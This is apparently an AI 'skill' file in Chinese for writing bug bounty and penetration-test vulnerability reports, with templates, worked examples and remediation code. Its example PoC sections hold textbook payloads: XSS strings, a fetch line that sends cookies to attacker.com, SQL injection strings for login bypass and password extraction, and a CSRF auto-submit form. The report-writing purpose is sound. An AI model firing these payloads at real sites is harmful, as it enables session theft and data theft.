# Bug-Bounty-Report-Generator - 漏洞报告生成技能

**来源**: Bug Bounty 课程学习提取
**版本**: 1.0
**创建时间**: 2026-04-02

---

## 功能描述

帮助用户生成规范、专业的漏洞报告，适用于 Bug Bounty 平台提交或内部安全报告。

**支持场景**:
- Bug Bounty 平台提交 (HackerOne/Bugcrowd/Intigriti)
- 内部安全报告
- 渗透测试报告
- 漏洞披露文档

---

## 触发条件

用户需要编写漏洞报告时触发，例如:
- "帮我写一个 XSS 漏洞报告"
- "生成漏洞报告模板"
- "这个漏洞怎么描述"
- "润色一下我的报告"

---

## 报告结构

### 标准漏洞报告模板

```markdown
# [漏洞标题]

## 概要
[一句话描述漏洞]

## 漏洞类型
[如：XSS / SQL Injection / SSRF 等]

## 风险等级
[低 / 中 / 高 / 严重]

## CVSS 评分
[可选，如：CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]

## 目标信息
- **URL**: [漏洞所在 URL]
- **参数**: [漏洞参数名称]
- **发现时间**: [日期]

## 漏洞描述
[详细描述漏洞原理和成因]

## 复现步骤
1. [步骤 1]
2. [步骤 2]
3. [步骤 3]
...

## 证明概念 (PoC)
[代码/请求示例]

## 影响说明
[漏洞可能造成的危害]

## 修复建议
[具体的修复方案]

## 参考链接
[相关资源链接]

## 附录
[截图/视频/额外信息]
```

---

## 各部分编写指南

### 1. 标题

**要求**: 清晰、简洁、包含关键信息

**好的示例**:
- ✅ "Stored XSS in Comment Section Allows Session Hijacking"
- ✅ "SQL Injection in User Search Endpoint Exposes 100k+ User Records"
- ✅ "SSRF via Image Import Feature Accesses Internal Metadata Service"

**不好的示例**:
- ❌ "XSS found"
- ❌ "Security issue"
- ❌ "Bug on your site"

---

### 2. 概要

**要求**: 一句话概括漏洞，包含类型和影响

**模板**:
```
[漏洞类型] in [功能/位置] allows [攻击者类型] to [影响]
```

**示例**:
```
Stored XSS in the comment submission feature allows attackers to 
steal user session cookies and perform actions on behalf of victims.

SQL Injection in the /api/v1/users/search endpoint allows 
unauthenticated attackers to extract sensitive user data including 
password hashes and email addresses.
```

---

### 3. 漏洞描述

**要求**: 详细但不冗长，解释技术原理

**内容**:
- 漏洞出现在哪个功能
- 漏洞产生的原因 (技术层面)
- 为什么这是一个安全问题

**示例 (XSS)**:
```
The comment submission feature on /posts/{id}/comment does not 
properly sanitize user input before rendering it in the HTML response. 
The application reflects the user-supplied "comment" parameter directly 
into the DOM without HTML entity encoding, allowing attackers to inject 
arbitrary JavaScript code that executes in the context of other users' 
browsers.

The vulnerable code pattern:
```javascript
// Vulnerable
document.getElementById('comment-section').innerHTML = userComment;
```
```

**示例 (SQLi)**:
```
The user search API endpoint at /api/v1/users/search constructs SQL 
queries using string concatenation with user-supplied input. The 
"username" parameter is directly interpolated into the SQL query without 
parameterization or proper escaping, enabling attackers to modify the 
query logic and extract arbitrary data from the database.

The vulnerable code pattern:
```python
# Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```
```

---

### 4. 复现步骤

**要求**: 详细、可复现、逐步说明

**模板**:
```
1. 访问 [URL]
2. 在 [位置] 输入 [Payload]
3. 点击 [按钮]
4. 观察 [现象]
5. [可选] 验证 [效果]
```

**示例 (XSS)**:
```
## 复现步骤

1. 访问 https://target.com/posts/123
2. 在评论框中输入以下 Payload:
   ```
   <script>alert(document.cookie)</script>
   ```
3. 点击 "Submit Comment" 按钮
4. 页面刷新后，弹出包含当前用户 Cookie 的警告框
5. 任意访问该帖子的用户都会执行注入的 JavaScript 代码

## 验证截图
[附上截图]
```

**示例 (SQLi)**:
```
## 复现步骤

1. 访问 https://target.com/api/v1/users/search
2. 发送以下 HTTP 请求:
   ```http
   POST /api/v1/users/search HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   {"username": "admin' OR '1'='1"}
   ```
3. 观察响应返回所有用户数据，而非仅 admin 用户
4. 使用以下 Payload 获取数据库版本:
   ```
   admin' UNION SELECT version(),NULL,NULL--
   ```
5. 响应中包含 MySQL 版本信息

## 验证请求
[附上完整 HTTP 请求/响应]
```

---

### 5. 证明概念 (PoC)

**要求**: 最小化、可执行、安全

**示例 (XSS)**:
```html
<!-- 最小化 PoC -->
<script>alert(1)</script>

<!-- 实际利用 PoC (仅用于演示) -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**示例 (SQLi)**:
```http
### 认证绕过
POST /login HTTP/1.1
username=admin'--
password=anything

### 数据提取
POST /search HTTP/1.1
query=' UNION SELECT username,password FROM users--

### 时间盲注
POST /search HTTP/1.1
query=' AND SLEEP(5)--
```

**示例 (CSRF)**:
```html
<!DOCTYPE html>
<html>
<body>
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

---

### 6. 影响说明

**要求**: 具体、量化、不夸大

**示例 (XSS)**:
```
## 影响说明

此漏洞允许攻击者:

1. **窃取用户会话**: 通过 document.cookie 获取会话 Token，
   可接管用户账户

2. **执行未授权操作**: 以用户身份执行任何操作，如:
   - 修改账户设置
   - 进行购买/转账
   - 发布内容

3. **钓鱼攻击**: 伪造登录页面窃取凭证

4. **传播恶意代码**: 蠕虫式自我复制传播

受影响用户：所有访问评论页面的用户 (估计日均 10,000+ PV)
```

**示例 (SQLi)**:
```
## 影响说明

此漏洞允许攻击者:

1. **数据泄露**: 读取数据库任意表，包括:
   - 用户信息 (用户名/邮箱/手机号)
   - 密码哈希 (可能导致撞库攻击)
   - 订单/支付信息

2. **认证绕过**: 无需密码登录任意账户

3. **数据篡改**: 修改或删除数据

4. **权限提升**: 在某些配置下可执行系统命令

受影响数据：约 150,000 用户记录
```

**示例 (SSRF)**:
```
## 影响说明

此漏洞允许攻击者:

1. **访问内网服务**: 扫描并访问内部网络资源

2. **读取云元数据**: 获取 AWS IAM 凭证，可能导致:
   - 接管云资源
   - 访问其他云服务
   - 数据泄露

3. **端口扫描**: 发现内网开放端口和服务

4. **攻击内网应用**: 利用内网服务漏洞进一步渗透

受影响范围：整个内网环境和云基础设施
```

---

### 7. 修复建议

**要求**: 具体、可操作、有代码示例

**示例 (XSS)**:
```
## 修复建议

### 短期修复 (立即实施)

1. **输出编码**: 对所有用户输入进行 HTML 实体编码

```javascript
// 修复后
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, m => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  }[m]));
}

document.getElementById('comment-section').textContent = userComment;
```

2. **使用安全 API**: 使用 textContent 代替 innerHTML

```javascript
// 修复后
element.textContent = userInput;  // 自动编码
```

### 长期修复 (建议实施)

3. **Content-Security-Policy**: 添加 CSP Header 限制脚本执行

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. **HttpOnly Cookie**: 设置会话 Cookie 为 HttpOnly

```
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

5. **输入验证**: 对用户输入进行白名单验证

```javascript
if (!/^[a-zA-Z0-9\s.,!?]+$/.test(userInput)) {
  throw new Error('Invalid input');
}
```
```

**示例 (SQLi)**:
```
## 修复建议

### 立即修复

1. **参数化查询**: 使用 Prepared Statements

```python
# 修复前 ( vulnerable )
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)

# 修复后 ( parameterized )
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

2. **使用 ORM**: 采用 SQLAlchemy 或 Django ORM

```python
# SQLAlchemy
user = session.query(User).filter_by(username=username).first()

# Django ORM
user = User.objects.get(username=username)
```

### 额外建议

3. **输入验证**: 验证用户输入格式

```python
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    raise ValueError('Invalid username format')
```

4. **最小权限**: 数据库账号只授予必要权限

```sql
-- 只授予 SELECT 权限
GRANT SELECT ON database.users TO 'webapp'@'localhost';
```

5. **错误处理**: 不向用户显示详细错误信息

```python
try:
    # 数据库操作
except Exception:
    logger.error("Database error")
    return "An error occurred", 500  # 不显示详细错误
```
```

---

### 8. 参考链接

**示例**:
```
## 参考链接

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS Labs: https://portswigger.net/web-security/cross-site-scripting
- MDN Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
```

---

## 完整报告示例

### 示例 1: XSS 漏洞报告

```markdown
# Stored XSS in Comment Section Allows Session Hijacking

## 概要
Comment submission feature contains stored XSS vulnerability allowing 
attackers to steal user session cookies.

## 漏洞类型
Cross-Site Scripting (XSS) - Stored

## 风险等级
高 (High)

## CVSS 评分
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (7.6)

## 目标信息
- **URL**: https://target.com/posts/{id}
- **参数**: comment (POST body)
- **发现时间**: 2026-04-02

## 漏洞描述
The comment submission feature does not properly sanitize user input 
before storing and rendering it. User-supplied content is reflected in 
the HTML response without HTML entity encoding, allowing persistent 
JavaScript injection.

## 复现步骤

1. 访问 https://target.com/posts/123
2. 在评论框输入:
   ```
   <script>alert(document.cookie)</script>
   ```
3. 点击 "Submit Comment"
4. 页面刷新后弹出警告框显示当前 Cookie
5. 任何其他用户访问该帖子都会执行注入的脚本

## 证明概念

```http
POST /posts/123/comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>
```

## 影响说明

- 攻击者可窃取任意用户会话 Cookie
- 可接管用户账户执行未授权操作
- 可能进行钓鱼攻击或恶意软件分发
- 所有访问帖子的用户都受影响

## 修复建议

1. 输出时进行 HTML 实体编码
2. 使用 textContent 代替 innerHTML
3. 实施 Content-Security-Policy
4. 设置 Cookie 为 HttpOnly

详细代码示例见附录。

## 参考链接

- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
```

---

## 报告质量检查清单

提交前检查:

- [ ] 标题清晰描述漏洞
- [ ] 概要一句话概括
- [ ] 复现步骤详细可执行
- [ ] PoC 可正常工作
- [ ] 影响说明具体不夸大
- [ ] 修复建议可操作
- [ ] 截图/视频清晰
- [ ] 无拼写语法错误
- [ ] 语气专业礼貌
- [ ] 敏感信息已打码

---

## 安全声明

⚠️ **本技能仅用于**:
- 授权的安全测试报告
- Bug Bounty 平台提交
- 内部安全沟通

❌ **禁止用于**:
- 虚假报告
- 敲诈勒索
- 未经授权的披露

请遵守负责任的披露原则和当地法律法规。

---

*Skill 版本：1.0 | 基于 Bug Bounty 课程提取 | 2026-04-02*
